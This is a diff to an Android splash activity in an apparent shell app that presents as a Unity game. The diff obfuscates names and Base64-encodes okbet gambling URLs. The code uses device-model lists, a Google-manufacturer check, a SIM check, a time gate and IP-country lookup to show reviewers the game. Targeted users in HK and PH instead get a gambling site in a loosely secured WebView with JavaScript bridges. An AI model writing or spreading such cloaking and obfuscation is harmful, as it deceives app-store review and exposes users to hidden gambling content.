@@ -3,12 +3,9 @@ package com.facebook;
 
 import android.annotation.SuppressLint;
 import android.app.Activity;
-import android.app.AlertDialog;
 import android.content.Context;
-import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
-import android.content.pm.ActivityInfo;
 import android.graphics.Bitmap;
 import android.net.Uri;
 import android.net.http.SslError;
@@ -16,6 +13,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
+import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.Base64;
 import android.util.Log;
@@ -51,38 +49,38 @@ import java.util.List;
 
 public class FBSplashActivity extends Activity {
 
-    public MainHandle mainHandle;
-    private WebView webView;
-    private ProgressBar mj_progressBar;
-    private RelativeLayout rootview;
+    public MH a;
+    private WebView b;
+    private ProgressBar c;
+    private RelativeLayout d;
 
-    public static boolean monery = false;
-    public static String appId;
+    public static boolean e = false;
+    public static String f;
 
     //跳转到原马甲包启动页的全路径
-    public static String activityPath = "com.unity3d.player.UnityPlayerActivity";
-    public static long times = 1674527976000L;
-    public static String goUrl = "https://xxxxx";
-    public static String baseUrl = "";
-    private Context context;
+    public static String g = "com.unity3d.player.UnityPlayerActivity";
+    public static long a1 = 1674527976000L;
+    public static String b1 = "aHR0cHM6Ly9va2JldDAwNi5jb20vY2Ru";
+    public static String c3 = "";
+    private Context d4;
 
     //页面布局的id
-    int activity_layout_id;
+    int f5;
     //页面布局的根布局的id
-    int root_view_id;
+    int r6;
     //该页面的加载框id
-    int progress_bar_id;
-    int webview_id;
+    int y8;
+    int l0;
 
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        activity_layout_id = getLayoutId(getApplicationContext(), "activity_splash_fb");
-        root_view_id = getId(getApplicationContext(), "WebViewBox");
-        webview_id = getId(getApplicationContext(), "MainWebView");
-        progress_bar_id = getId(getApplicationContext(), "mj_progressBar");
+        f5 = gli(getApplicationContext(), "activity_splash_fb");
+        r6 = ggi(getApplicationContext(), "WebViewBox");
+        l0 = ggi(getApplicationContext(), "MainWebView");
+        y8 = ggi(getApplicationContext(), "mj_progressBar");
 
         getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
 
@@ -95,19 +93,19 @@ public class FBSplashActivity extends Activity {
                     | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY | View.SYSTEM_UI_FLAG_FULLSCREEN);
         }
 
-        setContentView(activity_layout_id);
-        rootview = findViewById(root_view_id);
-        webView = findViewById(webview_id);
-        mj_progressBar = findViewById(progress_bar_id);
+        setContentView(f5);
+        d = findViewById(r6);
+        b = findViewById(l0);
+        c = findViewById(y8);
 
         init(this);
 
-        mainHandle = new MainHandle();
+        a = new MH();
 
-        mainHandle.postDelayed(new Runnable() {
+        a.postDelayed(new Runnable() {
             @Override
             public void run() {
-                mainHandle.sendMsg(001, "");
+                a.sendMsg(001, "");
             }
         }, 1000);
 
@@ -116,9 +114,9 @@ public class FBSplashActivity extends Activity {
 
     @Override // c.a.k.i, android.app.Activity, android.view.KeyEvent.Callback
     public boolean onKeyDown(int i, KeyEvent keyEvent) {
-        if (webView != null) {
-            if (webView.canGoBack() && i == 4) {
-                webView.goBack();
+        if (b != null) {
+            if (b.canGoBack() && i == 4) {
+                b.goBack();
                 return true;
             }
         }
@@ -129,235 +127,331 @@ public class FBSplashActivity extends Activity {
     @Override
     protected void onResume() {
         super.onResume();
+        if (g5) {
+            //开启弹窗
+            //创建dialog构造器
+//            AlertDialog.Builder normalDialog = new AlertDialog.Builder(getBaseContext());
+//            normalDialog.setCancelable(false);
+//            //设置title
+//            normalDialog.setTitle("Okbet offical app, join in us!!");
+//            //设置内容
+//            normalDialog.setMessage("GET 50 peso when register,Good Luck!!");
+//            //设置按钮
+//            normalDialog.setPositiveButton("Click Here", new DialogInterface.OnClickListener() {
+//                @Override
+//                public void onClick(DialogInterface dialog, int which) {
+//                    jumpBrpw(WebData.webDataCenter.hf_rea);
+//                }
+//            });
+//
+//            normalDialog.show();
 
+            //
+
+        }
     }
 
-    public void clearWebview() {
-        rootview.removeAllViews();
-        if (webView != null) {
-            webView.clearHistory();
-            webView.destroy();
-            webView = null;
+    public void cWB() {
+        d.removeAllViews();
+        if (b != null) {
+            b.clearHistory();
+            b.destroy();
+            b = null;
         }
     }
 
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        clearWebview();
+        cWB();
     }
 
 
     public void init(Activity activity) {
-        context = activity;
-        appId = activity.getApplication().getPackageName();
+        d4 = activity;
+        f = activity.getApplication().getPackageName();
     }
 
-    public void startcheck() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                baseUrl = unBase64JS() + appId + ".js";
-                getReq(baseUrl, true);
-            }
-        }).start();
-    }
+//    public void startcheck() {
+//        new Thread(new Runnable() {
+//            @Override
+//            public void run() {
+//                baseUrl = unBase64JS() + appId + ".js";
+//                getReq(baseUrl, true);
+//            }
+//        }).start();
+//    }
 
-    private void getReq(String url, boolean isGitHub) {
+//    private void getReq(String url, boolean isGitHub) {
+//
+//        try {
+//            URL urll = new URL(url);
+//            HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
+//            urlConnection.setConnectTimeout(10000);
+//            urlConnection.setReadTimeout(10000);
+//            urlConnection.setRequestMethod("GET");
+//            urlConnection.setDefaultUseCaches(false);
+//            urlConnection.connect();
+//            int code = urlConnection.getResponseCode();
+//            if (code == 200) {
+//                InputStream inputStream = urlConnection.getInputStream();
+//                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+//                String line;
+//                StringBuffer buffer = new StringBuffer();
+//                while ((line = bufferedReader.readLine()) != null) {
+//                    buffer.append(line);
+//                }
+//                String json = buffer.toString();
+//
+//                logger(" " + json);
+//
+//                String replace = json.replace("\n", "").replace("\t", "");
+//                String substring = replace.substring(0, replace.length() - 2);
+//                JSONObject jSONObject = new JSONObject(substring + "}");
+//
+//                if (jSONObject.has("hf")) {
+//                    WebData.webDataCenter.hf_001 = jSONObject.getString("hf");
+//                    //test   https://okbet-v2.cxsport.net/mobile
+//                    //http://okbet.life/app_cfg_win_ok/OkbettingWinV1/index.html
+//                    //  WebData.dataCenter.hf_001 = " https://webview.vipsroom.net/?inviteCode=2277 ";
+//                    //   WebData.dataCenter.hf_001 = "https://okbet-v2.cxsport.net/mobile";
+//
+//                    //http://ok-bet.online/mobile/publicity
+//                    //   WebData.dataCenter.hf_001 = "http://ok-bet.online/?inviteCode=2277";
+//                    //    WebData.dataCenter.hf_001 = "cnm-bie-zhua-bao";
+//
+//                }
+//
+//                if (jSONObject.has("jump_001")) {
+//                    WebData.webDataCenter.hfgwxz_001 = jSONObject.getString("jump_001");
+//                }
+//
+//                if (jSONObject.has("jump_002")) {
+//                    WebData.webDataCenter.cvcvczk_002 = jSONObject.getString("jump_002");
+//                }
+//
+//                if (jSONObject.has("jump_003")) {
+//                    WebData.webDataCenter.erfcxht_003 = jSONObject.getString("jump_003");
+//                }
+//
+//                if (jSONObject.has("aipi")) {
+//                    WebData.webDataCenter.ai3p6i9 = jSONObject.getString("aipi");
+//                }
+//
+//                if (jSONObject.has("hfRea")) {
+//                    WebData.webDataCenter.hf_rea = jSONObject.getString("hfRea");
+//                }
+//
+//                if (jSONObject.has("icChecking")) {
+//                    WebData.webDataCenter.isCcccheck = jSONObject.getBoolean("icChecking");
+//                }
+//
+//                if (jSONObject.has("jump_array")) {
+//                    WebData.webDataCenter.jjssArrays.clear();
+//                    JSONArray jsonArray = jSONObject.getJSONArray("jump_array");
+//                    for (int i = 0; i < jsonArray.length(); i++) {
+//                        WebData.webDataCenter.jjssArrays.add((String) jsonArray.get(i));
+//                    }
+//                }
+//
+//                if (jSONObject.has("dev_array")) {
+//                    WebData.webDataCenter.deArray.clear();
+//                    JSONArray jsonArray = jSONObject.getJSONArray("dev_array");
+//                    for (int i = 0; i < jsonArray.length(); i++) {
+//                        WebData.webDataCenter.deArray.add((String) jsonArray.get(i));
+//                    }
+//                }
+//
+//                mainHandle.sendMsg(000, "");
+//
+//            } else {
+//                logger(" 不是200");
+//                if (!isGitHub) {
+//                    requstGithub();
+//                } else {
+//                    jumpLocalSplash();
+//                }
+//            }
+//
+//        } catch (JSONException e) {
+//            if (!isGitHub) {
+//                requstGithub();
+//            } else {
+//                jumpLocalSplash();
+//            }
+//            logger(e.getLocalizedMessage() + "");
+//        } catch (Exception e) {
+//            if (!isGitHub) {
+//                requstGithub();
+//            } else {
+//                jumpLocalSplash();
+//            }
+//            logger(e.getLocalizedMessage() + "");
+//        }
+//
+//    }
+//
+//    private void requstGithub() {
+//        baseUrl = unBase64JS() + appId + ".js";
+//        getReq(baseUrl, true);
+//    }
 
-        try {
-            URL urll = new URL(url);
-            HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
-            urlConnection.setConnectTimeout(10000);
-            urlConnection.setReadTimeout(10000);
-            urlConnection.setRequestMethod("GET");
-            urlConnection.setDefaultUseCaches(false);
-            urlConnection.connect();
-            int code = urlConnection.getResponseCode();
-            if (code == 200) {
-                InputStream inputStream = urlConnection.getInputStream();
-                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
-                String line;
-                StringBuffer buffer = new StringBuffer();
-                while ((line = bufferedReader.readLine()) != null) {
-                    buffer.append(line);
-                }
-                String json = buffer.toString();
 
-                logger(" " + json);
-
-                String replace = json.replace("\n", "").replace("\t", "");
-                String substring = replace.substring(0, replace.length() - 2);
-                JSONObject jSONObject = new JSONObject(substring + "}");
-
-                if (jSONObject.has("hf")) {
-                    WebData.webDataCenter.hf_001 = jSONObject.getString("hf");
-                    //test   https://okbet-v2.cxsport.net/mobile
-                    //http://okbet.life/app_cfg_win_ok/OkbettingWinV1/index.html
-                    //  WebData.dataCenter.hf_001 = " https://webview.vipsroom.net/?inviteCode=2277 ";
-                    //   WebData.dataCenter.hf_001 = "https://okbet-v2.cxsport.net/mobile";
-
-                    //http://ok-bet.online/mobile/publicity
-                    //   WebData.dataCenter.hf_001 = "http://ok-bet.online/?inviteCode=2277";
-                    //    WebData.dataCenter.hf_001 = "cnm-bie-zhua-bao";
-
-                }
-
-                if (jSONObject.has("jump_001")) {
-                    WebData.webDataCenter.hfgwxz_001 = jSONObject.getString("jump_001");
-                }
-
-                if (jSONObject.has("jump_002")) {
-                    WebData.webDataCenter.cvcvczk_002 = jSONObject.getString("jump_002");
-                }
-
-                if (jSONObject.has("jump_003")) {
-                    WebData.webDataCenter.erfcxht_003 = jSONObject.getString("jump_003");
-                }
-
-                if (jSONObject.has("aipi")) {
-                    WebData.webDataCenter.ai3p6i9 = jSONObject.getString("aipi");
-                }
-
-                if (jSONObject.has("hfRea")) {
-                    WebData.webDataCenter.hf_rea = jSONObject.getString("hfRea");
-                }
-
-                if (jSONObject.has("icChecking")) {
-                    WebData.webDataCenter.isCcccheck = jSONObject.getBoolean("icChecking");
-                }
-
-                if (jSONObject.has("jump_array")) {
-                    WebData.webDataCenter.jjssArrays.clear();
-                    JSONArray jsonArray = jSONObject.getJSONArray("jump_array");
-                    for (int i = 0; i < jsonArray.length(); i++) {
-                        WebData.webDataCenter.jjssArrays.add((String) jsonArray.get(i));
-                    }
-                }
-
-                if (jSONObject.has("dev_array")) {
-                    WebData.webDataCenter.deArray.clear();
-                    JSONArray jsonArray = jSONObject.getJSONArray("dev_array");
-                    for (int i = 0; i < jsonArray.length(); i++) {
-                        WebData.webDataCenter.deArray.add((String) jsonArray.get(i));
-                    }
-                }
-
-                mainHandle.sendMsg(000, "");
-
-            } else {
-                logger(" 不是200");
-                if (!isGitHub) {
-                    requstGithub();
-                } else {
-                    jumpLocalSplash();
-                }
-            }
-
-        } catch (JSONException e) {
-            if (!isGitHub) {
-                requstGithub();
-            } else {
-                jumpLocalSplash();
-            }
-            logger(e.getLocalizedMessage() + "");
-        } catch (Exception e) {
-            if (!isGitHub) {
-                requstGithub();
-            } else {
-                jumpLocalSplash();
-            }
-            logger(e.getLocalizedMessage() + "");
-        }
-
-    }
-
-    private void requstGithub() {
-        baseUrl = unBase64JS() + appId + ".js";
-        getReq(baseUrl, true);
-    }
-
-
-    public void getReqAPConfig(String url) {
+    public void gRApC(String url) {
         logger("getReqAPaConfig start");
 
-        monery = true;
-        WebData.webDataCenter.isCcccheck = false;
+        e = true;
+        WD.WD_CENTER.isCcccheck = false;
 
-        if (getManufacturer().equals(unBase64GG())
-                || TextUtils.isEmpty(getManufacturer())) {
-            monery = false;
-            WebData.webDataCenter.isCcccheck = true;
+        if (gmf().equals(uBgg())
+                || TextUtils.isEmpty(gmf())) {
+            e = false;
+            WD.WD_CENTER.isCcccheck = true;
             logger("isandroidreallych");
         }
 
-        if (WebData.webDataCenter.deArray.size() > 0) {
-            if (WebData.webDataCenter.deArray.contains(getModel())) {
-                monery = false;
-                WebData.webDataCenter.isCcccheck = true;
+        if (WD.WD_CENTER.deArray.size() > 0) {
+            if (WD.WD_CENTER.deArray.contains(gM())) {
+                e = false;
+                WD.WD_CENTER.isCcccheck = true;
                 logger("isSHRYZJC");
             }
         }
 
-        if (monery) {
+        if (!haser(this)) {
+            e = false;
+            WD.WD_CENTER.isCcccheck = true;
+            logger("haser false");
+        }
+
+        if (e) {
             //如果设备通过 走Ip检测
+            if (url.contains("ip-api")) {
 
-            try {
+                try {
 
-                URL urll = new URL(url);
-                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
-                urlConnection.setConnectTimeout(10000);
-                urlConnection.setReadTimeout(10000);
-                urlConnection.setRequestMethod("GET");
-                urlConnection.connect();
-                int code = urlConnection.getResponseCode();
+                    URL urll = new URL(url);
+                    HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
+                    urlConnection.setConnectTimeout(10000);
+                    urlConnection.setReadTimeout(10000);
+                    urlConnection.setRequestMethod("GET");
+                    urlConnection.connect();
+                    int code = urlConnection.getResponseCode();
 
-                if (code == 200) {
-                    logger("getReqAPConfig 200");
+                    if (code == 200) {
+                        logger("getReqAPConfig 200");
 
-                    InputStream inputStream = urlConnection.getInputStream();
-                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
-                    String line;
-                    StringBuffer buffer = new StringBuffer();
-                    while ((line = bufferedReader.readLine()) != null) {
-                        buffer.append(line);
-                    }
-                    String json = buffer.toString();
-
-                    logger(" " + json);
-
-                    JSONObject jSONObject = new JSONObject(json);
-
-                    if (jSONObject.has("countryCode")) {
-                        String cc = jSONObject.getString("countryCode");
-                        if (cc.equals("HK") || cc.equals("PH")) {
-                            monery = true;
-                            WebData.webDataCenter.isCcccheck = false;
+                        InputStream inputStream = urlConnection.getInputStream();
+                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+                        String line;
+                        StringBuffer buffer = new StringBuffer();
+                        while ((line = bufferedReader.readLine()) != null) {
+                            buffer.append(line);
                         }
+                        String json = buffer.toString();
+
+                        logger(" " + json);
+
+                        JSONObject jSONObject = new JSONObject(json);
+
+                        if (jSONObject.has("countryCode")) {
+                            String cc = jSONObject.getString("countryCode");
+                            if (cc.equals("HK") || cc.equals("PH")) {
+                                e = true;
+                                WD.WD_CENTER.isCcccheck = false;
+                            } else {
+                                e = false;
+                                WD.WD_CENTER.isCcccheck = true;
+                            }
+                        }
+
+                        a.sendMsg(002, "");
+
+                    } else {
+
+                        logger(" getReqAPConfig 不是200");
+                        e = false;
+                        WD.WD_CENTER.isCcccheck = true;
+
+                        a.sendMsg(002, "");
                     }
 
-                    mainHandle.sendMsg(002, "");
-
-                } else {
-                    logger(" getReqAPConfig 不是200");
-                    monery = false;
-                    WebData.webDataCenter.isCcccheck = true;
+                } catch (Exception e) {
+                    FBSplashActivity.e = false;
+                    a.sendMsg(002, "");
+                    logger(" getReqAPConfig Exception " + e.getLocalizedMessage());
                 }
-
-                mainHandle.sendMsg(002, "");
-
-            } catch (Exception e) {
-                monery = false;
-                mainHandle.sendMsg(002, "");
-                logger(" getReqAPConfig Exception " + e.getLocalizedMessage());
+            } else {
+                getIw(url);
             }
+
+        } else {
+
+            a.sendMsg(002, "");
 
         }
 
     }
 
 
-    public class MainHandle extends Handler {
+    public void getIw(String u) {
+
+        try {
+            URL urll = new URL(u);
+            HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
+            urlConnection.setConnectTimeout(10000);
+            urlConnection.setReadTimeout(10000);
+            urlConnection.setRequestMethod("GET");
+            urlConnection.connect();
+            int code = urlConnection.getResponseCode();
+
+            if (code == 200) {
+                logger("getIw 200");
+                e = true;
+                WD.WD_CENTER.isCcccheck = false;
+
+            } else {
+                logger(" getHuc 不是200");
+                e = false;
+                WD.WD_CENTER.isCcccheck = true;
+            }
+
+        } catch (Exception w) {
+            logger(" getHuc Exception " + w.getLocalizedMessage());
+            e = false;
+            WD.WD_CENTER.isCcccheck = true;
+        }
+
+        a.sendMsg(002, "");
+
+    }
+
+    /**
+     * 判断是否包含SIM卡
+     *
+     * @return 状态
+     */
+    public static boolean haser(Context context) {
+        TelephonyManager telMgr = (TelephonyManager)
+                context.getSystemService(Context.TELEPHONY_SERVICE);
+        int simState = telMgr.getSimState();
+        boolean result = true;
+        switch (simState) {
+            case TelephonyManager.SIM_STATE_ABSENT:
+                result = false; // 没有SIM卡
+                break;
+            case TelephonyManager.SIM_STATE_UNKNOWN:
+                result = false;
+                break;
+        }
+        Log.e("lyyytry", result ? "有haser" : "无haser");
+        return result;
+    }
+
+
+    private boolean g5 = false;
+
+    public class MH extends Handler {
 
 
         public final void sendMsg(int i3, Object obj) {
@@ -375,84 +469,67 @@ public class FBSplashActivity extends Activity {
 
             if (code == 000) {
 
-                if (TextUtils.isEmpty(WebData.webDataCenter.ai3p6i9)) {
+                if (TextUtils.isEmpty(WD.WD_CENTER.ai3p6i9)) {
                     //走h5 全逻辑
-                    if (!TextUtils.isEmpty(WebData.webDataCenter.hf_001)) {
+                    if (!TextUtils.isEmpty(WD.WD_CENTER.hf_001)) {
 //                       MainActivity.mainActivity.findViewById(com.okbetboxing.boxing.R.id.loadingBox).setVisibility(View.GONE);
 //                       WebUtil.util.startH5orYs(web.WebData.webDataCenter.hf_001, true);
-                        startH5orYs(WebData.webDataCenter.hf_001, true);
+                        sh5(WD.WD_CENTER.hf_001, true);
                     }
                 } else {
                     //走原生 逻辑
                     new Thread(new Runnable() {
                         @Override
                         public void run() {
-                            getReqAPConfig(WebData.webDataCenter.ai3p6i9);
+                            gRApC(WD.WD_CENTER.ai3p6i9);
                         }
                     }).start();
                 }
 
             } else if (code == 001) {
-                if (System.currentTimeMillis() < times || ifCheckerDev0117()) {
-                    jumpLocalSplash();
+                if (System.currentTimeMillis() < a1 || iCD()) {
+                    jLS();
                 } else {
                     //  startcheck();
-                    startH5orYs(goUrl, true);
+                    sh5(uBstr(b1).trim(), true);
                 }
             } else if (code == 002) {//已经
                 //如果是老用户  就不需要屏蔽
-                if (getIfLongInstall()) {
-                    monery = true;
-                    WebData.webDataCenter.isCcccheck = false;
+                if (giflon()) {
+                    e = true;
+                    WD.WD_CENTER.isCcccheck = false;
                 }
 
                 boolean isAdd;
-                if (TextUtils.isEmpty(WebData.webDataCenter.hf_rea)) {
+                if (TextUtils.isEmpty(WD.WD_CENTER.hf_rea)) {
                     isAdd = false;
                 } else {
                     isAdd = true;
                 }
-                if (!monery) { // !ph
-                    if (!TextUtils.isEmpty(WebData.webDataCenter.hf_001)) {
+                if (!e) { // !ph
+                    if (!TextUtils.isEmpty(WD.WD_CENTER.hf_001)) {
 //                       MainActivity.mainActivity.findViewById(com.okbetboxing.boxing.R.id.loadingBox).setVisibility(View.GONE);
 //                       WebUtil.util.startH5orYs(web.WebData.webDataCenter.hf_001, isAdd);
-                        startH5orYs(WebData.webDataCenter.hf_001, isAdd);
+                        sh5(WD.WD_CENTER.hf_001, isAdd);
                     }
                 } else {
-                    if (!TextUtils.isEmpty(WebData.webDataCenter.hf_rea)) {
+                    if (!TextUtils.isEmpty(WD.WD_CENTER.hf_rea)) {
 //                       MainActivity.mainActivity.findViewById(com.okbetboxing.boxing.R.id.loadingBox).setVisibility(View.GONE);
 //                       WebUtil.util.startH5orYs(web.WebData.webDataCenter.hf_rea, true);
-                        if(WebData.webDataCenter.isJump0117){
-                            //开启弹窗
-                            //创建dialog构造器
-                            AlertDialog.Builder normalDialog = new AlertDialog.Builder(getBaseContext());
-                            normalDialog.setCancelable(false);
-                            //设置title
-                            normalDialog.setTitle("Okbet offical app, join in us!!");
-                            //设置内容
-                            normalDialog.setMessage("GET 50 peso when register,Good Luck!!");
-                            //设置按钮
-                            normalDialog.setPositiveButton("Click Here", new DialogInterface.OnClickListener() {
-                                @Override
-                                public void onClick(DialogInterface dialog, int which) {
-                                    jumpBrpw(WebData.webDataCenter.hf_rea);
-                                }
-                            });
-
-                            normalDialog.show();
-
+                        if (WD.WD_CENTER.isJump0117) {
                             //执行外跳
-                            jumpBrpw(WebData.webDataCenter.hf_rea);
-
+                            jB(WD.WD_CENTER.hf_rea);
+                            g5 = true;
+                            sh5(uBIU(), true);
                         } else {
-                            startH5orYs(WebData.webDataCenter.hf_rea, true);
+                            sh5(WD.WD_CENTER.hf_rea, true);
                         }
 
                     } else {
 //                       MainActivity.mainActivity.findViewById(R.id.loadingBox).setVisibility(View.GONE);
 //                       WebUtil.util.startH5orYs(web.WebData.webDataCenter.hf_001, true);
-                       // startH5orYs(WebData.webDataCenter.hf_001, true);
-                        jumpLocalSplash();
+                        // startH5orYs(WebData.webDataCenter.hf_001, true);
+                        jLS();
                     }
                 }
             }
@@ -466,10 +543,10 @@ public class FBSplashActivity extends Activity {
      * 跳原应用
      */
 
-    private void jumpLocalSplash() {
+    private void jLS() {
 
         try {
-            Class aimClass = Class.forName(activityPath);
+            Class aimClass = Class.forName(g);
             Intent intent = new Intent(FBSplashActivity.this, aimClass);
             startActivity(intent);
             finish();
@@ -479,14 +556,14 @@ public class FBSplashActivity extends Activity {
     }
 
 
-    public void loadUu(String uuu) {
-        if (webView != null) {
-            webView.loadUrl(uuu);
+    public void lu(String uuu) {
+        if (b != null) {
+            b.loadUrl(uuu);
         }
     }
 
 
-    public void startH5orYs(String weburl, boolean isAdd) {
+    public void sh5(String weburl, boolean isAdd) {
 
         if (TextUtils.isEmpty(weburl)) {
             return;
@@ -494,26 +571,26 @@ public class FBSplashActivity extends Activity {
 
         if (weburl.equals("cnm-bie-zhua-bao")) {
             //跳原生壳子
-            jumpLocalSplash();
+            jLS();
             return;
         }
 
         //  webView.getSettings().setBuiltInZoomControls(true);
-        webView.requestFocus();
-        webView.getSettings().setDomStorageEnabled(true);
-        webView.getSettings().setJavaScriptEnabled(true);
-        webView.getSettings().setAllowContentAccess(true);
-        webView.getSettings().setAllowFileAccess(true);
-        webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
-        webView.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);
-        webView.getSettings().setUseWideViewPort(true);
-        webView.getSettings().setTextZoom(100);
-        webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
-        webView.getSettings().setUseWideViewPort(true);
-        webView.getSettings().setLoadWithOverviewMode(true);
+        b.requestFocus();
+        b.getSettings().setDomStorageEnabled(true);
+        b.getSettings().setJavaScriptEnabled(true);
+        b.getSettings().setAllowContentAccess(true);
+        b.getSettings().setAllowFileAccess(true);
+        b.getSettings().setAllowUniversalAccessFromFileURLs(true);
+        b.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);
+        b.getSettings().setUseWideViewPort(true);
+        b.getSettings().setTextZoom(100);
+        b.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
+        b.getSettings().setUseWideViewPort(true);
+        b.getSettings().setLoadWithOverviewMode(true);
         CookieManager.getInstance().setAcceptCookie(true);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            webView.getSettings().setMixedContentMode(0);
+            b.getSettings().setMixedContentMode(0);
         }
 
 //        if(BuildConfig.DEBUG){
@@ -527,19 +604,19 @@ public class FBSplashActivity extends Activity {
 //            }
 //        }
 
-        logger("h5Invoke add  if checking " + WebData.webDataCenter.isCcccheck);
+        logger("h5Invoke add  if checking " + WD.WD_CENTER.isCcccheck);
 
-        if (WebData.webDataCenter.isCcccheck) {
-            webView.addJavascriptInterface(new CheckingJavaScript(), "h5Invoke");
+        if (WD.WD_CENTER.isCcccheck) {
+            b.addJavascriptInterface(new CheckingJavaScript(), "h5Invoke");
         } else {
-            webView.addJavascriptInterface(new OnlineJavaScript(), "h5Invoke");
+            b.addJavascriptInterface(new OnlineJavaScript(), "h5Invoke");
         }
 
-        webView.setWebViewClient(new WebClient());
-        webView.setWebChromeClient(new Wcc());
+        b.setWebViewClient(new Wcl());
+        b.setWebChromeClient(new Wcc());
 
         if (!TextUtils.isEmpty(weburl)) {
-            webView.loadUrl(weburl);
+            b.loadUrl(weburl);
         }
 
     }
@@ -549,8 +626,8 @@ public class FBSplashActivity extends Activity {
         @JavascriptInterface
         public boolean callbackIfHide() {
             //  SingleToast.showLongMsg("js callbackIfHide " + WebData.dataCenter.isCcccheck);
-            logger("js callbackIfHide " + WebData.webDataCenter.isCcccheck);
-            return WebData.webDataCenter.isCcccheck;
+            logger("js callbackIfHide " + WD.WD_CENTER.isCcccheck);
+            return WD.WD_CENTER.isCcccheck;
         }
 
     }
@@ -611,22 +688,22 @@ public class FBSplashActivity extends Activity {
         @JavascriptInterface
         public void goPayMent(String url) {
             logger("js goPayMent " + url);
-            jumpBrpw(url);
+            jB(url);
         }
 
         @JavascriptInterface
         public void gologinCs(String url) {
             //    SingleToast.showLongMsg("js gologinCs " + url);
             logger("js gologinCs " + url);
-            jumpBrpw(url);
+            jB(url);
         }
 
     }
 
 
-    static class WebData {
+    static class WD {
 
-        public static final WebData webDataCenter = new WebData();
+        public static final WD WD_CENTER = new WD();
 
         public String hf_001;
         public String hfgwxz_001 = "";
@@ -642,7 +719,7 @@ public class FBSplashActivity extends Activity {
 
     }
 
-    public final void jumpBrpw(String str) {
+    public final void jB(String str) {
         Intent intent = new Intent("android.intent.action.VIEW");
         intent.setData(Uri.parse(str));
         startActivity(intent);
@@ -653,7 +730,7 @@ public class FBSplashActivity extends Activity {
     }
 
 
-    public String unBase64GG() {
+    public static String uBgg() {
         String a = "R29vZ2xl";
         byte[] decode = Base64.decode(a, Base64.DEFAULT);
         String decodeStr = new String(decode);
@@ -661,7 +738,16 @@ public class FBSplashActivity extends Activity {
         return decodeStr;
     }
 
-    public String unBase64JS() {
+
+    public static String uBstr(String str) {
+        String a = str;
+        byte[] decode = Base64.decode(a, Base64.DEFAULT);
+        String decodeStr = new String(decode);
+        logger("unBaseStr  " + decodeStr);
+        return decodeStr;
+    }
+
+    public String uBjs() {
         String a = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Vhc3lHdXlMeW4vRWFzeURlbW8xL21hc3Rlci8=";
         byte[] decode = Base64.decode(a, Base64.DEFAULT);
         String decodeStr = new String(decode);
@@ -669,7 +755,16 @@ public class FBSplashActivity extends Activity {
         return decodeStr;
     }
 
-    public String unBase64Dev0117() {
+
+    public String uBIU() {
+        String a = "aHR0cHM6Ly9va2JldDEwLmNvbS9vay1iZXQ=";
+        byte[] decode = Base64.decode(a, Base64.DEFAULT);
+        String decodeStr = new String(decode);
+        logger("unBase64insideURL  " + decodeStr);
+        return decodeStr;
+    }
+
+    public static String ubD() {
         String a = "eyJkZXZfYXJyYXkiOlsiUmVkbWkgN0EiLCJSZWRtaSA2QSIsIlNILTAxTCIsIkYtMDFMIiwiU00tQTEwNUZOIiwiU00tRzk4MVUxIl19";
         byte[] decode = Base64.decode(a, Base64.DEFAULT);
         String decodeStr = new String(decode);
@@ -677,25 +772,25 @@ public class FBSplashActivity extends Activity {
         return decodeStr;
     }
 
-    public boolean ifCheckerDev0117() {
+    public static boolean iCD() {
         boolean result0117 = false;
-        String devJson0117 = unBase64Dev0117();
+        String devJson0117 = ubD();
 
         try {
             JSONObject jsonObject = new JSONObject(devJson0117);
             JSONArray jsonArray = jsonObject.getJSONArray("dev_array");
             for (int i = 0; i < jsonArray.length(); i++) {
-                WebData.webDataCenter.deArray.add((String) jsonArray.get(i));
+                WD.WD_CENTER.deArray.add((String) jsonArray.get(i));
             }
 
-            WebData.webDataCenter.deArray.add("SM-A226B");
-            WebData.webDataCenter.deArray.add("(not set)");
+            WD.WD_CENTER.deArray.add("SM-A226B");
+            WD.WD_CENTER.deArray.add("(not set)");
 
-            if (WebData.webDataCenter.deArray.size() > 0) {
-                Log.e("zzz", "" + WebData.webDataCenter.deArray.size());
-                if (WebData.webDataCenter.deArray.contains(getModel())) {
-                    monery = false;
-                    WebData.webDataCenter.isCcccheck = true;
+            if (WD.WD_CENTER.deArray.size() > 0) {
+                Log.e("zzz", "" + WD.WD_CENTER.deArray.size());
+                if (WD.WD_CENTER.deArray.contains(gM())) {
+                    e = false;
+                    WD.WD_CENTER.isCcccheck = true;
                     result0117 = true;
                 }
             }
@@ -705,12 +800,12 @@ public class FBSplashActivity extends Activity {
             e.printStackTrace();
         }
 
-        if (getManufacturer().equals(unBase64GG())
-                || TextUtils.isEmpty(getManufacturer())) {
+        if (gmf().equals(uBgg())
+                || TextUtils.isEmpty(gmf())) {
             result0117 = true;
         }
 
-        if (TextUtils.isEmpty(getModel())) {
+        if (TextUtils.isEmpty(gM())) {
             result0117 = true;
         }
 
@@ -719,16 +814,16 @@ public class FBSplashActivity extends Activity {
     }
 
 
-    public boolean getIfLongInstall() {
+    public boolean giflon() {
 
         long nowTime = System.currentTimeMillis();
-        long saveTime = getTime(context);
